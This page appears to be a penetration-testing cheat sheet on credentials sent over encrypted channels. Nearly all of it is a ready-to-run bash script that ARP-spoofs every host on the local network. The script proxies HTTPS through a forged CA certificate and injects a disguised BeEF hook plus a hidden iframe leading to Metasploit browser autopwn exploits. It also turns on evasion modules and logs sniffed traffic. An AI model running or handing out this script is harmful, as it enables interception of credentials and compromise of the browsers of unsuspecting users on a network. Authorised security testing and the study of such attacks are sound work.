# Credentials Encrypted Channel

## Check List

* [ ] _Identify sensitive information transmitted through the various channels._
* [ ] _Assess the privacy and security of the channels used._

## Cheat Sheet

### Man In The Middle

#### [BeEF ](https://beefproject.com/)& [Bettercap](https://www.bettercap.org/)

_Create Script_

```bash
sudo nano mitm-beef-bettercap.sh
```

```bash
#!/bin/bash

# --- Color Codes ---
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
CYAN='\e[1;36m'
RESET='\e[0m'

color_print() {
  printf "${!1}%b${RESET}\n" "$2"
}

# --- Root Check ---
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT..."; exit 1; }

# --- Kill previous BeEF/Metasploit processes ---
pkill -f 'ngrok|ruby|msfconsole|apache2';wait

# --- Tool Check ---
for i in wget openssl metasploit-framework beef-xss apache2 bettercap arp-scan; do
  if ! command -v "$i" &>/dev/null; then
    color_print RED "[X] $i NOT installed!"
    apt install -y $i
  fi
done

# --- Detect interface + LAN IP ---
IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -1)
LAN=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
[[ -z "$IFACE" || -z "$LAN" ]] && { color_print RED "[X] Interface or IP detection failed"; exit 1; }

# --- Start Metasploit ---
color_print GREEN "[*] Starting Metasploit..."
msfconsole -qx "load msgrpc ServerHost=${LAN} Pass=abc123 SSL=y; use auxiliary/server/browser_autopwn2; set LHOST $LAN; set URIPATH /pwn; run -z" &>/dev/null &

# --- Configure BeEF ---
color_print GREEN "[*] Updating BeEF config..."
CONFIG_YAML="/usr/share/beef-xss/config.yaml"
METASPLOIT_YAML="/usr/share/beef-xss/extensions/metasploit/config.yaml"
AUTOPWN_YAML="/usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml"
EVASION_YAML="/usr/share/beef-xss/extensions/evasion/config.yaml"

# Main BeEF config
if grep -q 'https: false' "$CONFIG_YAML"; then
  sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
         -e 's|passwd: "beef"|passwd: "00980098"|g' \
         -e 's|# public:|public:|g' \
         -e 's|#     host: "" # public|     host: "'$LAN'" # public|' \
         -e 's|#     port: "" # public|     port: "443" # public|g' \
         -e 's|#     https: false|     https: true|g' \
         -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
         -e 's|hook.js|jqueryctl.js|g' \
         -e 's|BEEFHOOK|UNKSESSION|g' "$CONFIG_YAML"
else
  sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
         -e 's|passwd: "beef"|passwd: "00980098"|g' \
         -e 's|# public:|public:|g' \
         -e 's|host: ".*" # public|host: "'$LAN'" # public|' \
         -e 's|port: ".*" # public|port: "443" # public|g' \
         -e 's|https: false|https: true|g' \
         -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
         -e 's|hook.js|jqueryctl.js|g' \
         -e 's|BEEFHOOK|UNKSESSION|g' "$CONFIG_YAML"
fi

# Metasploit extension config
sed -i -e 's|enable: false|enable: true|g' \
       -e 's|host: ".*"|host: "'$LAN'"|g' \
       -e 's|callback_host: ".*"|callback_host: "'$LAN'"|g' \
       -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' "$METASPLOIT_YAML"

# Enable modules
sed -i -e 's|enable: false|enable: true|g' "$AUTOPWN_YAML"
sed -i -e 's|enable: false|enable: true|g' "$EVASION_YAML"

# --- Start BeEF ---
color_print GREEN "[*] Starting BeEF..."
cd /usr/share/beef-xss && ./beef -x &>/dev/null &

# --- Generate fake CA ---
CERT_DIR="$HOME/.bettercap/certs"
mkdir -p "$CERT_DIR"

CERT_KEY="$CERT_DIR/bettercap.key"
CERT_CRT="$CERT_DIR/bettercap.crt"
CERT_PEM="$CERT_DIR/bettercap-ca.pem"

if [[ ! -f "$CERT_PEM" ]]; then
  color_print YELLOW "[*] Generating fake CA certificate..."
  openssl req -x509 -newkey rsa:2048 -nodes \
    -keyout "$CERT_KEY" \
    -out "$CERT_CRT" \
    -days 3650 \
    -subj "/CN=Bettercap MITM Proxy"
  cat "$CERT_CRT" "$CERT_KEY" > "$CERT_PEM"
  color_print GREEN "[✓] Fake CA created: $CERT_PEM"
else
  color_print GREEN "[✓] Existing fake CA found: $CERT_PEM"
fi

# --- Serve the cert over HTTP ---
cp "$CERT_CRT" "/var/www/html/apple.crt"
service apache2 start;service postgresql start

# --- Final Info ---
color_print GREEN "[*] BeEF Panel: http://$LAN/ui/panel"
color_print GREEN "[*] BeEF USER: unk9vvn | PASS: 00980098"
color_print GREEN "[*] BeEF > Commands > Misc > Create Invisible Iframe > URL: http://$LAN:8080/pwn > Execute"

# --- Scan network ---
color_print CYAN "[*] Scanning LAN to find targets..."
TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain | awk '{print $1}' | grep -v "$LAN" | paste -sd ',' -)
[[ -z "$TARGETS" ]] && { color_print RED "[X] No targets found."; exit 1; }

# --- Run Bettercap ---
color_print GREEN "[*] Starting Bettercap MITM attack..."

bettercap -iface "$IFACE" -eval "\
set arp.spoof.targets $TARGETS; \
set arp.spoof.internal true; \
set https.proxy.engine true; \
set https.proxy.sslstrip false; \
set https.proxy.cert $CERT_CRT; \
set https.proxy.key $CERT_KEY; \
set http.proxy.injectjs https://$LAN/jqueryctl.js; \
set http.proxy.injecthtml '<iframe src=\"http://$LAN:8080/pwn\" width=0 height=0 style=\"display:none\"></iframe>'; \
set net.sniff.verbose true; \
set net.sniff.output /tmp/bettercap.log; \
net.sniff on; http.proxy on; https.proxy on; arp.spoof on"
```

_Run & Execute_

```bash
sudo chmod +x mitm-beef-bettercap.sh;sudo ./mitm-beef-bettercap.sh
```
